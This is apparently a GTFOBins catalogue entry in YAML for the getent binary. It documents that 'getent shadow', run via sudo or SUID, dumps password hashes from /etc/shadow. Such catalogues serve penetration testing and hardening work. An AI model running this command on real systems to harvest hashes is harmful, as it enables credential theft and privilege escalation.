<!-- source: https://github.com/GTFOBins/GTFOBins.github.io/blob/acd524623f9c406acedd2754ebd9c2431f3675ad/_gtfobins/getent -->
---
functions:
  privilege-escalation:
  - code: |-
      getent shadow
    comment: |-
      This allows to dump password hashes from the `/etc/shadow` file.
    contexts:
      sudo:
      suid:
...
